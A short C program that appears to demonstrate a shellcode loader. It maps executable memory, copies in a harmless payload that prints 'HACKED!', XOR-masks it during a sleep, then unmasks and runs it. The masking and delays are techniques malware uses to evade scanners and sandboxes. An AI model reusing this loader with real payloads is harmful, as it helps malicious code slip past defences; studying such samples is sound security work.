#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

unsigned char shellcode[] = {
    0x48, 0x31, 0xc0,
    0x50,
    0x48, 0xbb, 0x48, 0x41, 0x43, 0x4b, 0x45, 0x44, 0x21, 0x0a,
    0x53,

    0x48, 0x89, 0xe6,
    0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,
    0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,
    0x48, 0xc7, 0xc2, 0x08, 0x00, 0x00, 0x00,
    0x0f, 0x05,

    0xb0, 0x3c,
    0x48, 0x31, 0xff,
    0x0f, 0x05
};

void xor_crypt(unsigned char *code, size_t len) {
    for (size_t i = 0; i < len; i++) {
        code[i] ^= 0xAA; 
    }
}

int main(){
    printf("[*] Loader Active (PID: %d)\n", getpid());
    size_t len = sizeof(shellcode);
    void *exec_mem = mmap(0, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_mem == MAP_FAILED) {
        perror("mmap failed");
        return 1;
    }

    memcpy(exec_mem, shellcode, len);
    memset(shellcode, 0, len);
    printf("[*] Encrypting Shellcode...\n");
    xor_crypt((unsigned char *)exec_mem, len);
    sleep(15);

    printf("[*] Decrypting Shellcode...\n");
    xor_crypt((unsigned char *)exec_mem, len);

    printf("[*] Unpacking and Preparing Shellcode...\n");
    sleep(15);

    printf("[*] Executing Shellcode...\n");
    void (*func)() = (void (*)())exec_mem;
    func();

    return 0;
}